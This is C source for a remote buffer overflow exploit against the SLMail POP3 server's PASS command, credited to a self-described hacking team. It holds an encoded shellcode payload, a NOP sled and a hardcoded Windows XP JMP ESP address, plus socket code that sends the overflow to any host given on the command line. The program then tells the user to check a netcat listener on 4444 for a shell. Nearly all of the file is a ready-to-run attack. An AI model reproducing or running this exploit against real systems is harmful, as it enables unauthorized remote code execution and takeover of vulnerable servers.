/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/* replaced shellcode with more appropriate shellcode */

unsigned char shellcode[] = 
"\xd9\xed\xd9\x74\x24\xf4\xbd\xfe\xc7\x0f\xf9\x58\x31\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\x96\xd4\xed\x0c\x9a\x33\x73"
"\xee\x62\xc4\x14\x66\x87\xf5\x14\x1c\xcc\xa6\xa4\x56\x80\x4a"
"\x4e\x3a\x30\xd8\x22\x93\x37\x69\x88\xc5\x76\x6a\xa1\x36\x19"
"\xe8\xb8\x6a\xf9\xd1\x72\x7f\xf8\x16\x6e\x72\xa8\xcf\xe4\x21"
"\x5c\x7b\xb0\xf9\xd7\x37\x54\x7a\x04\x8f\x57\xab\x9b\x9b\x01"
"\x6b\x1a\x4f\x3a\x22\x04\x8c\x07\xfc\xbf\x66\xf3\xff\x69\xb7"
"\xfc\xac\x54\x77\x0f\xac\x91\xb0\xf0\xdb\xeb\xc2\x8d\xdb\x28"
"\xb8\x49\x69\xaa\x1a\x19\xc9\x16\x9a\xce\x8c\xdd\x90\xbb\xdb"
"\xb9\xb4\x3a\x0f\xb2\xc1\xb7\xae\x14\x40\x83\x94\xb0\x08\x57"
"\xb4\xe1\xf4\x36\xc9\xf1\x56\xe6\x6f\x7a\x7a\xf3\x1d\x21\x13"
"\x30\x2c\xd9\xe3\x5e\x27\xaa\xd1\xc1\x93\x24\x5a\x89\x3d\xb3"
"\x9d\xa0\xfa\x2b\x60\x4b\xfb\x62\xa7\x1f\xab\x1c\x0e\x20\x20"
"\xdc\xaf\xf5\xe7\x8c\x1f\xa6\x47\x7c\xe0\x16\x20\x96\xef\x49"
"\x50\x99\x25\xe2\xfb\x60\xae\x07\xf7\x6a\xed\x70\x05\x6a\xe0"
"\xdc\x80\x8c\x68\xcd\xc4\x07\x05\x74\x4d\xd3\xb4\x79\x5b\x9e"
"\xf7\xf2\x68\x5f\xb9\xf2\x05\x73\x2e\xf3\x53\x29\xf9\x0c\x4e"
"\x45\x65\x9e\x15\x95\xe0\x83\x81\xc2\xa5\x72\xd8\x86\x5b\x2c"
"\x72\xb4\xa1\xa8\xbd\x7c\x7e\x09\x43\x7d\xf3\x35\x67\x6d\xcd"
"\xb6\x23\xd9\x81\xe0\xfd\xb7\x67\x5b\x4c\x61\x3e\x30\x06\xe5"
"\xc7\x7a\x99\x73\xc8\x56\x6f\x9b\x79\x0f\x36\xa4\xb6\xc7\xbe"
"\xdd\xaa\x77\x40\x34\x6f\x97\xa3\x9c\x9a\x30\x7a\x75\x27\x5d"
"\x7d\xa0\x64\x58\xfe\x40\x15\x9f\x1e\x21\x10\xdb\x98\xda\x68"
"\x74\x4d\xdc\xdf\x75\x44";

void exploit(int sock) {
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char userbuf[] = "USER madivan\r\n";
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 2610);
      strncat(evil, nopsled, 16);
      strncat(evil, shellcode, 351);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP XP 5F4A358F FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Check your netcat listener on 4444 for a shell.\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: %s <host> \n\n", argv[0]); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
